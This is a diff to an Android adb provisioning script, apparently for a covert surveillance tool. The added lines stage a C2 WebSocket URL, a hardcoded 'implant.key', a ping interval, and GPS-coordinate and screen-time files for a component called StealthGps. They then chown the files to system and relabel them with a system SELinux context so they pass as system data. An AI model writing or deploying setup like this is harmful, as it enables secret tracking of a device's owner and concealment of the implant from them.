@@ -90,8 +90,17 @@ adb shell "mkdir -p /data/local/tmp/ota && chmod 777 /data/local/tmp/ota"
 
 # Pre-create the GPS handoff files so StealthGps can write them without
 # needing directory write access under /data/local/tmp.
-adb shell "touch /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled"
-adb shell "chmod 666 /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled"
+adb shell 'mkdir -p /data/local/tmp /data/system
+  printf "%s\n" "ws://127.0.0.1:8000/ws" > /data/local/tmp/c2_url.txt
+  printf "%s\n" "DeltaForce2027" > /data/local/tmp/implant.key
+  printf "%s\n" "60" > /data/system/ping_interval.txt
+  touch /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable
+  rm -f /data/local/tmp/reporter_disable
+  chmod 666 /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable 2>/dev/null || true
+  chmod 644 /data/system/ping_interval.txt 2>/dev/null || true
+  chown system:system /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable 2>/dev/null || true
+  chown root:root /data/system/ping_interval.txt 2>/dev/null || true
+  chcon u:object_r:system_data_file:s0 /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable /data/system/ping_interval.txt 2>/dev/null || true'
 
 # Migrate ping_interval.txt from old path to new path if needed
 adb shell "[ -f /data/local/tmp/ping_interval.txt ] && cp /data/local/tmp/ping_interval.txt /data/system/ping_interval.txt && chmod 644 /data/system/ping_interval.txt || true"
